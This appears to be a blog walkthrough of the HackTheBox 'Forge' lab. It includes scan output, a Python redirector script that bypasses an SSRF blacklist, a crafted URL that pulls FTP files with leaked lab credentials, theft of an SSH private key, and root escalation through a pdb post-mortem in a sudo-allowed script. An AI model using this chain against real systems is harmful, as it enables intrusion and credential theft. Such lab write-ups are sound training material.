---
title: "HackTheBox - Forge"
date: 2022-07-29T12:26:51-04:00
draft: false
tags: []
author: "Trent Deal"
showToc: true
TocOpen: false
hidemeta: false
comments: false
description: ""
disableHLJS: false
disableShare: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: false
ShowRssButtonInSectionTermList: true
UseHugoToc: false
cover:
    image: "" # image path/url
    alt: "" # alt text
    caption: "" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
---

```nohighlight
# Nmap 7.92 scan initiated Wed Jul 27 18:34:26 2022 as: nmap -sS -sCV -oA scans/nmap/init 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 27 18:34:35 2022 -- 1 IP address (1 host up) scanned in 9.23 seconds
```

- nmap does not follow redirect to http://forge.htb, add it to /etc/hosts and run gobster vhost
    - ftp is also filtered, yay

```nohighlight
trent@kali[Forge]$ cat /etc/hosts
...
10.10.11.111    forge.htb admin.forge.htb
...
```

```nohighlight
trent@kali[Forge]$ gobuster vhost -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/07/27 18:49:01 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]

===============================================================
2022/07/27 18:49:25 Finished
===============================================================
```

![Admin interface only available on localhost](/images/forge/website/admin/only_localhost_allowed.png)

![Homepage for http://forge.htb](/images/forge/website/homepage.png)

- http://forge.htb/upload can be used to upload images by file or url
 
- uploading by url and making it callback to a netcat listener shows the request was made by
  python-requests/2.25.1, so the server is likely running some python web server

![Upload from url](/images/forge/website/upload_from_url.png)
![python-requests version](/images/forge/website/python_requests_callback.png)

- url uploads only accept http/https

![Blacklist protocols](/images/forge/website/forge_htb_blacklisted_url_uploads.png)

- Cant make requests to http://forge.htb or http://admin.forge.htb

![Blacklisted urls](/images/forge/website/forge_htb_blacklisted_url_uploads.png)

- we can get around the blacklist by redirecting to where we actually want to go. We then can
  navigate to the generated link on the website and we can view the raw page in burpsuite

```python
#!/usr/bin/env python3

# https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#bypass-via-redirect
# python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

- We cant see the site in the browser cause it tries to render the page as a jpg, but we can see the
  html in Burpsuite

![Successful ssrf attack](/images/forge/website/admin/homepage_html_via_ssrf_redirect.png)

- we have found some ftp creds, yay
    - user:heightofsecurity123!

![FTP credentials and internal /upload](/images/forge/website/admin/announcements.png)

- making a call to http://admin.forge.htb with the creds shows the ftp files, had to escape the ! in
  the password to make the script work
  
```class="nohighlight"
trent@kali[Forge]$ ./redirect.py "http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123%21@10.10.11.111"
10.10.11.111 - - [28/Jul/2022 17:14:08] "GET / HTTP/1.1" 302 -
```

- running the same script to search for .ssh in ftp shows there is an id_rsa there. Score

![ftp ssh folder](/images/forge/ftp/ssh_folder.png)
![ftp id_rsa](/images/forge/ftp/id_rsa.png)

- we can then login as the "user" user with ssh

![Shell as user](/images/forge/shell_as_user.png)
![User flag](/images/forge/user_get.png)

- running linpeas shows "user" can run "/usr/bin/python3 /opt/remote-manage.py" without a password 

![linpeas sudo -l results](/images/forge/linpeas/sudo_l.png)

```python
# /opt/remote-manage.py

#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

- script runs pdb when it hits an exception, which we can force by sending a lot of characters to
  the socket.
    - To do this, we need to open an ssh session that runs the script, and another that connects to
      it, since it only listens on localhost
    - then we can import os and execute code from there in pdb
    - UPDATE: it actually just needs to be a non number, but 1024 "A" also works

![Shell as root](/images/forge/shell_as_root.png)
![Root flag](/images/forge/root_get.png)

